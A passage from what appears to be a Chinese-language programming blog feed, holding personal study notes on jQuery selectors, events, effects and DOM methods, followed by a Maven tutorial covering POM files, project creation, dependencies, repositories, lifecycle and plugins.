align="left">$(“[href]”)</td><td align="left">选取带有 href 属性的元素</td></tr><tr><td align="left">$(“a[target&#x3D;’_blank’]”)</td><td align="left">选取所有 target 属性值等于 “_blank” 的 <a> 元素</a></td></tr><tr><td align="left">$(“a[target!&#x3D;’_blank’]”)</td><td align="left">选取所有 target 属性值不等于 “_blank” 的 <a> 元素</a></td></tr><tr><td align="left">$(“:button”)</td><td align="left">选取所有 type&#x3D;”button” 的 <input> 元素 和 <button> 元素</button></td></tr><tr><td align="left">$(“tr:even”)</td><td align="left">选取偶数位置的 </td></tr><tr> 元素</tr><tr><td align="left">$(“tr:odd”)</td><td align="left">选取奇数位置的 </td></tr><tr> 元素</tr></tbody></table><h5 id="指定选择"><a href="#指定选择" class="headerlink" title="指定选择"></a>指定选择</h5><p>如果选取了多个元素可以使用下面的方法来获取更详细的元素</p><ul><li><p>first() 获取第一个元素</p><ul><li><blockquote><p>$(“p”).first() 获取第一个p</p></blockquote></li></ul></li><li><p>last() 获取最后一个元素</p></li><li><p>eq() 获取和指定下标一样的元素</p><ul><li><blockquote><p>$(document).ready(function(){<br>$(“p”).eq(1);<br>});</p></blockquote></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/jQuery-2.png" alt="image-20220115210013313"></p><p>放学喽不记喽~~~</p><h4 id="操作函数"><a href="#操作函数" class="headerlink" title="操作函数"></a>操作函数</h4><h5 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h5><ul><li><p>click():为元素添加一个click事件</p><ul><li>&#96;&#96;&#96;JavaScript<br>$(“p”).click(function(){<br>  &#x2F;&#x2F; action goes here!!<br>});<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">-</span> 其他事件就不具体解释了<br><br><span class="hljs-bullet">-</span> dblclick():双击<br><br><span class="hljs-bullet">-</span> mouseenter():鼠标越过<br><br><span class="hljs-bullet">-</span> mouseleave():鼠标离开<br><br><span class="hljs-bullet">-</span> mousedown():按下<br><br><span class="hljs-bullet">-</span> mouseup():松开<br><br><span class="hljs-bullet">-</span> hover():悬停<br><br><span class="hljs-bullet">-</span> focus():聚焦<br><br><span class="hljs-bullet">-</span> blur():失去聚焦<br><br><span class="hljs-bullet">-</span> keydown():按下一直触发,返回键盘代码<br><br><span class="hljs-bullet">-</span> keypress():按下并产生一个字符时触发,==shift,ctrl等不会触发==<br><br><span class="hljs-bullet">-</span> keyup():松开时触发,返回键盘代码<br><br><br><br><span class="hljs-section">##### 效果</span><br><br><span class="hljs-bullet">-</span> hide():隐藏元素<br><br><span class="hljs-bullet">  -</span> <span class="hljs-code">```JavaScript</span><br><span class="hljs-code">    $(&quot;#hide&quot;).click(function()&#123;</span><br><span class="hljs-code">      $(&quot;p&quot;).hide();</span><br><span class="hljs-code">    &#125;);</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>show():显示元素</p></li><li><p>toggle():显示和隐藏之间切换</p><ul><li><blockquote><p>$(<em>selector</em>).toggle(<em>speed,callback</em>);</p></blockquote></li><li><p>speed代表显示速度</p></li><li><p>callback回调函数,$(selector)选中了几个callback就会调用几次,该函数可以是匿名函数,callback函数名后加括号，会立刻执行函数体，而不是等到显示&#x2F;隐藏完成后才执行</p></li></ul></li><li><p>fadeIn():淡入已经隐藏的元素</p><ul><li><blockquote><p>$(<em>selector</em>).fadeIn(<em>speed,callback</em>);</p></blockquote></li><li><p>参数和上面的差不多</p></li></ul></li><li><p>fadeOut():淡出已经显示的元素</p><ul><li><blockquote><p>$(<em>selector</em>).fadeOut(<em>speed,callback</em>);</p></blockquote></li></ul></li><li><p>fadeToggle():淡入淡出切换</p></li><li><p>fadeToggle():不透明度</p><ul><li><blockquote><p>$(<em>selector</em>).fadeTo(<em>speed,opacity,callback</em>);</p></blockquote></li><li><p>opacity:用于设置不透明度0-1</p></li></ul></li></ul><p>下面的都差不多了就不给例子了</p><ul><li><p>slideDown():往下滑</p></li><li><p>slideUp():往上滑</p></li><li><p>slideToggle():上下切换</p></li><li><p>animate():使用css动画</p><ul><li><blockquote><p>$(<em>selector</em>).animate({<em>params</em>}<em>,speed,callback</em>);</p></blockquote><p>params是css参数</p></li><li><p>&#96;&#96;&#96;JavaScript<br>$(“button”).click(function(){<br>  $(“div”).animate({<br>left:’250px’,<br>opacity:’0.5’,<br>height:’150px’,<br>width:’150px’<br>  });<br>}); </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 上面的<span class="hljs-number">150</span>px这种数可以换成==height:<span class="hljs-string">&quot;+=150px&quot;</span>==这种相对参数或者使用预设值==height:<span class="hljs-string">&quot;toggle&quot;</span>==这种<br><br>- animate也可以进行按顺序<br><br>  - ```JavaScript<br>    $(<span class="hljs-string">&quot;button&quot;</span>).<span class="hljs-title function_ invoke__">click</span>(function()&#123;<br>      <span class="hljs-keyword">var</span> div=$(<span class="hljs-string">&quot;div&quot;</span>);<br>      div.<span class="hljs-title function_ invoke__">animate</span>(&#123;<span class="hljs-attr">height</span>:<span class="hljs-string">&#x27;300px&#x27;</span>,<span class="hljs-attr">opacity</span>:<span class="hljs-string">&#x27;0.4&#x27;</span>&#125;,<span class="hljs-string">&quot;slow&quot;</span>);<br>      div.<span class="hljs-title function_ invoke__">animate</span>(&#123;<span class="hljs-attr">width</span>:<span class="hljs-string">&#x27;300px&#x27;</span>,<span class="hljs-attr">opacity</span>:<span class="hljs-string">&#x27;0.8&#x27;</span>&#125;,<span class="hljs-string">&quot;slow&quot;</span>);<br>      div.<span class="hljs-title function_ invoke__">animate</span>(&#123;<span class="hljs-attr">height</span>:<span class="hljs-string">&#x27;100px&#x27;</span>,<span class="hljs-attr">opacity</span>:<span class="hljs-string">&#x27;0.4&#x27;</span>&#125;,<span class="hljs-string">&quot;slow&quot;</span>);<br>      div.<span class="hljs-title function_ invoke__">animate</span>(&#123;<span class="hljs-attr">width</span>:<span class="hljs-string">&#x27;100px&#x27;</span>,<span class="hljs-attr">opacity</span>:<span class="hljs-string">&#x27;0.8&#x27;</span>&#125;,<span class="hljs-string">&quot;slow&quot;</span>);<br>    &#125;); <br></code></pre></td></tr></table></figure></li></ul></li><li><p>stop():用来停止</p><ul><li><blockquote><p>$(<em>selector</em>).stop(<em>stopAll,goToEnd</em>);</p></blockquote></li><li><p>stopAll的意思:是否停止当前所有的动画,无论是否完成默认是,false</p></li><li><p>goToEnd的意思:立刻完成所有的动画</p></li><li><p>&#96;&#96;&#96;JavaScript<br>$(“#stop”).click(function(){<br>  $(“#panel”).stop();<br>});</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><br>  <br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">注意回调函数是在事件完成时调用</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">动作时可以一直.的如下:</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">``</span><span class="hljs-string">`JavaScript</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">$(&quot;#p1&quot;).css(&quot;color&quot;,&quot;red&quot;)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">  .slideUp(2000)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">  .slideDown(2000);</span></span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="标签元素操作"><a href="#标签元素操作" class="headerlink" title="标签元素操作"></a>标签元素操作</h4><h5 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h5><ul><li><p>text():获取或者设置值</p><ul><li>&#96;&#96;&#96;JavaScript<br>$(“#bt1”).text()&#x2F;&#x2F;获取值<br>$(“#bt1”).text(“asdfas”)&#x2F;&#x2F;设置值<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><br>- html<span class="hljs-params">()</span>:获取或者设置值<span class="hljs-params">(可以生成html标签)</span><br><br>- val<span class="hljs-params">()</span>:设置或者获取表单的数据<br><br>  &gt; 上面这几个设置值的时候用回调函数的时候<br>  &gt;<br>  &gt; function<span class="hljs-params">(i,origText)</span>&#123;<br>  &gt;   return &quot;Old text: &quot; + origText + &quot; New text: Hello world!<br>  &gt;   <span class="hljs-params">(index: <span class="hljs-string">&quot; + i + &quot;</span>)</span>&quot;;<br>  &gt;  &#125;<br>  &gt;<br>  &gt; 如上的函数第一个param是代表当前元素的下标,第二个代表以前的值<br><br>- attr<span class="hljs-params">()</span>:用于获取或者设置属性的值<br><br>##### 添加或者删除元素<br><br>- append<span class="hljs-params">(s)</span> 在标签的内部的最后加一个元素<br><br>  - 可以生成s中的标签<br><br>- prepend<span class="hljs-params">(s)</span> 在标签的开头部分插入内容<br><br>- after 代表在选定标签的外部,的后面插入元素<br><br>- before 代表在选定标签的外部,的前面插入元素<br><br>- remove<span class="hljs-params">()</span>:删除当前以及子元素<br><br>  - &gt; $<span class="hljs-params">(<span class="hljs-string">&quot;p&quot;</span>)</span>.remove(<span class="hljs-string">&quot;.italic&quot;</span>);<br>    &gt;<br>    &gt; 删除p标签下面所有的class=italic的元素<br><br>- empty<span class="hljs-params">()</span>:删除子元素<br><br>##### class操作<br><br>- addClass<span class="hljs-params">()</span>:添加class<br><br>- removeClass<span class="hljs-params">()</span>:删除class<br><br>- toggleClass<span class="hljs-params">()</span>:<br><br>  - $<span class="hljs-params">(p)</span>.toggleClass(<span class="hljs-string">&quot;sss&quot;</span>):如果p的class有sss就删除,没有就加上<br><br>- css<span class="hljs-params">()</span>:改变html的css<br><br>  - ```JavaScript <br>    $<span class="hljs-params">(<span class="hljs-string">&quot;p&quot;</span>)</span>.css(<span class="hljs-string">&quot;background-color&quot;</span>,<span class="hljs-string">&quot;red&quot;</span>);//改变p标签的背景色<br>    $(<span class="hljs-string">&quot;p&quot;</span>).css();//返回css的属性值<br></code></pre></td></tr></table></figure></li></ul></li></ul><h5 id="尺寸"><a href="#尺寸" class="headerlink" title="尺寸"></a>尺寸</h5><p>:smirk:<a href="https://www.w3cschool.cn/jquery/jquery-dimensions.html">https://www.w3cschool.cn/jquery/jquery-dimensions.html</a></p><h5 id="遍历相关元素"><a href="#遍历相关元素" class="headerlink" title="遍历相关元素"></a>遍历相关元素</h5><p>下面这些都可以写参数用于定位</p><ul><li><p>parent() 返回直接元素</p></li><li><p>parents() 返回所有祖先元素</p></li><li><p>parentsUntil() 返回介于两个元素之间的元素</p><ul><li><pre><code class="JavaScript">$(document).ready(function()&#123;  $(&quot;span&quot;).parentsUntil(&quot;div&quot;);&#125;);</code></pre></li></ul></li><li><p>children() 返回所有直接子元素</p></li><li><p>find() 返回后面所有的元素</p></li></ul><p>同胞元素和查找父子元素类似</p><ul><li>siblings() 方法返回被选元素的所有同胞元素</li><li>next() 返回下一个同胞元素</li><li>nextAll() 返回所有同胞元素</li><li>nextUntil() 返回介于元素之间的同胞元素</li><li>prev() 返回前一个元素</li><li>prevAll() 返回前面所有的元素</li><li>prevUntil() 返回前面介于元素之间的同胞元素</li></ul>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>JavaScript</tag>
      
      <tag>Ajax</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Maven</title>
    <link href="/2022/01/14/Maven/"/>
    <url>/2022/01/14/Maven/</url>
    
    <content type="html"><![CDATA[<h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><p>介绍：</p><p>是一个用于管理Java项目的包管理工具</p><p>Maven 能够帮助开发者完成以下任务：</p><ul><li>构建项目</li><li>生成文档</li><li>创建报告</li><li>维护依赖</li><li>软件配置管理</li><li>发布</li><li>部署</li></ul><p>然后默认情况下maven项目是这样的</p><table><thead><tr><th>文件</th><th>目录</th></tr></thead><tbody><tr><td>Java 源代码</td><td>src&#x2F;main&#x2F;java</td></tr><tr><td>资源文件</td><td>src&#x2F;main&#x2F;resources</td></tr><tr><td>测试源代码</td><td>src&#x2F;test&#x2F;java</td></tr><tr><td>测试资源文件</td><td>src&#x2F;test&#x2F;resources</td></tr><tr><td>打包输出文件</td><td>target</td></tr><tr><td>编译输出文件</td><td>target&#x2F;classes</td></tr></tbody></table><p>emmm，maven的下载安装我就不讲了</p><h3 id="POM文件"><a href="#POM文件" class="headerlink" title="POM文件"></a>POM文件</h3><p>该文件类型一般是xml</p><p>一般包含如下内容:</p><ul><li>项目依赖</li><li>插件</li><li>目标</li><li>构建时的配置文件</li><li>版本 </li><li>开发者</li><li>邮件列表</li></ul><blockquote><p>在创建 POM 之前，首先要确定工程组（groupId），及其名称（artifactId）和版本，在仓库中这些属性是项目的唯一标识。</p></blockquote><p>一般的文件内容模板是</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.biancheng.www<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>节点</th><th>描述</th></tr></thead><tbody><tr><td>groupId</td><td>项目组 ID，定义当前 Maven 项目隶属的组织或公司，通常是唯一的。它的取值一般是项目所属公司或组织的网址或 URL 的反写，例如 net.biancheng.www。</td></tr><tr><td>artifactId</td><td>项目 ID，通常是项目的名称。groupId 和 artifactId 一起定义了项目在仓库中的位置。</td></tr><tr><td>version</td><td>项目版本。</td></tr></tbody></table><p>所有的 POM 均继承自一个父 POM，这个父 POM 被称为 Super POM,如果想要查看Super POM的默认配置使用下面这个命令:</p><blockquote><p>mvn help:effective-pom</p></blockquote><p>太长了就不粘贴了….</p><h4 id="创建-Maven-项目"><a href="#创建-Maven-项目" class="headerlink" title="创建 Maven 项目"></a>创建 Maven 项目</h4><p>我们通过模板来创建一个maven项目</p><p>首先cd到你要创建项目的目录</p><blockquote><p>mvn archetype:generate -DgroupId&#x3D;net.biancheng.www -DartifactId&#x3D;helloMaven -DarchetypeArtifactId&#x3D;maven-archetype-quickstart -DinteractiveMode&#x3D;false</p></blockquote><p>上面这个是使用maven-archetype-quickstart模板来快速创建Maven</p><p>就相当于在idea中这么创建模板</p><ul><li>-DgroupId: 项目组 ID，通常为组织名或公司网址的反写。</li><li>-DartifactId: 项目名。</li><li>-DarchetypeArtifactId: 指定 ArchetypeId,maven-archetype-quickstart 用于快速创建一个简单的 Maven 项目。</li><li>-DinteractiveMode: 是否使用交互模式。</li></ul><p>以上面的项目为例子创建完成后目录结构大致如下：</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/maven-1.png" alt="image-20220114193503942"></p><h4 id="构建项目"><a href="#构建项目" class="headerlink" title="构建项目"></a>构建项目</h4><p>使用如下命令进行构建</p><blockquote><p>mvn clean package</p></blockquote><p>会生成一个target目录,而target目录如下</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/maven-2.png" alt="image-20220114193818618"></p><ul><li><p>classes：源代码编译后存放在该目录中。</p><ul><li><p>在这个目录下面命令即可开始运行</p></li><li><blockquote><p>java net.biancheng.<a href="http://www.app(这个就是开始那个构建的域名加上.app)/">www.App(这个就是开始那个构建的域名加上.App)</a></p></blockquote></li></ul></li><li><p>test-classes：测试源代码编译后并存放在该目录中。</p></li><li><p>surefire-reports：Maven 运行测试用例生成的测试报告存放在该目录中。</p></li><li><p>helloMaven-1.0-SNAPSHOT.jar：Maven 对项目进行打包生成的 jar 文件。</p></li></ul><p>&#x3D;&#x3D;maven是通过groupId,artifactId,version,packaging的来具体定位的&#x3D;&#x3D;</p><h4 id="依赖导入"><a href="#依赖导入" class="headerlink" title="依赖导入"></a>依赖导入</h4><p>如果我们要导入依赖时必须按照下面的格式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样maven会根据坐标来自动导入到项目中</p><p>根据组织名称(groupId),项目名称(artifactId),版本名称(version),type(依赖类型,大多情况不用管默认是jar)</p><ul><li>scope：依赖的范围。</li><li>optional：标记依赖是否可选。</li><li>exclusions：用来排除传递性依赖。</li></ul><p>至于从哪里找依赖,需要从下面这个链接</p><p><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p><h4 id="仓库介绍"><a href="#仓库介绍" class="headerlink" title="仓库介绍"></a>仓库介绍</h4><p>仓库分为本地仓库和远程仓库,如果我们定位依赖的时候会现在本地仓库搜索然后再去远程仓库搜索.</p><p>远程仓库又分为下面几个</p><ul><li>中央仓库是由 Maven 社区提供的一种特殊的远程仓库，它包含了绝大多数流行的开源构件。在默认情况下，当本地仓库没有 Maven 所需的构件时，会首先尝试从中央仓库下载。</li><li>私服是一种特殊的远程仓库，它通常设立在局域网内，用来代理所有外部的远程仓库。它的好处是可以节省带宽，比外部的远程仓库更加稳定。 </li><li>除了中央仓库和私服外，还有很多其他公共仓库，例如 JBoss Maven 库，Java.net Maven 库等等。</li></ul><p>本地仓库的设置一般在Maven下的conf&#x2F;settings.xml</p><p>这个文件下面的</p><blockquote><ol><li><strong>&lt;settings</strong> xmlns&#x3D;”<a href="http://maven.apache.org/SETTINGS/1.0.0&quot;">http://maven.apache.org/SETTINGS/1.0.0&quot;</a></li><li>​          xmlns:xsi&#x3D;”<a href="http://www.w3.org/2001/XMLSchema-instance&quot;">http://www.w3.org/2001/XMLSchema-instance&quot;</a></li><li>​          xsi:schemaLocation&#x3D;”<a href="http://maven.apache.org/SETTINGS/1.0.0">http://maven.apache.org/SETTINGS/1.0.0</a></li><li><a href="http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;**&gt;">http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;**&gt;</a>**</li><li>​    <strong><localRepository><strong>D:&#x2F;myRepository&#x2F;repository</strong></localRepository></strong></li><li><strong></strong></li></ol></blockquote><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><ul><li>clean：用于清理项目<ul><li>又可以分为如下三个阶段</li><li>pre-clean（清理前）</li><li>clean（清理）</li><li>post-clean（清理后）</li></ul></li><li>default：用于构建项目<ul><li>包含如下声明周期</li><li><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/maven-3.png" alt="image-20220114201141085"></li></ul></li><li>site：用于建立项目站点<ul><li>这个站点的项目构建步骤是下面这种</li><li>pre-site</li><li>site</li><li>post-site</li><li>site-deploy</li></ul></li></ul><h4 id="Maven插件"><a href="#Maven插件" class="headerlink" title="Maven插件"></a>Maven插件</h4><p>maven在上面的生命周期的每个任务不是maven来实现的而是用插件来实现的,maven本身不包含插件只有需要的时候才会去下载.</p><table><thead><tr><th>插件类型</th><th>描述</th></tr></thead><tbody><tr><td>Build plugins</td><td>在项目构建过程中执行，在 pom.xml 中的 build 元素中配置</td></tr><tr><td>Reporting plugins</td><td>在网站生成过程中执行，在 pom.xml 中的 reporting 元素中配置</td></tr></tbody></table><p>例如如下部分:</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/maven-4.png" alt="image-20220114202137641"></p><p>自定义插件绑定</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span>&gt;</span><br>...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- 绑定插件 maven-antrun-plugin --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-antrun-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!--自定义 id --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>www.biancheng.net clean<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!--插件目标绑定的构建阶段 --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>clean<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!--插件目标 --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>run<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!--配置 --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                            <span class="hljs-comment">&lt;!-- 执行的任务 --&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tasks</span>&gt;</span><br>                                <span class="hljs-comment">&lt;!--自定义文本信息 --&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">echo</span>&gt;</span>清理阶段，编程帮 欢迎您的到来，网址：www.biancheng.net<span class="hljs-tag">&lt;/<span class="hljs-name">echo</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">tasks</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span>               <br>                <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中execution下的各个含义是:</p><ul><li>id：任务的唯一标识。</li><li>phase：插件目标需要绑定的生命周期阶段。</li><li>goals：用于指定一组插件目标，其子元素 goal 用于指定一个插件目标。</li><li>configuration：该任务的配置，其子元素 tasks 用于指定该插件目标执行的任务。</li></ul><h4 id="导入本地"><a href="#导入本地" class="headerlink" title="导入本地"></a>导入本地</h4><p>如果我们要导入以前的maven项目就需要先将以前的项目打成一个jar包</p><p>使用mvn clean package包</p><p>然后再在需要该项目的pom.xml的dependencies中插入以下数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span 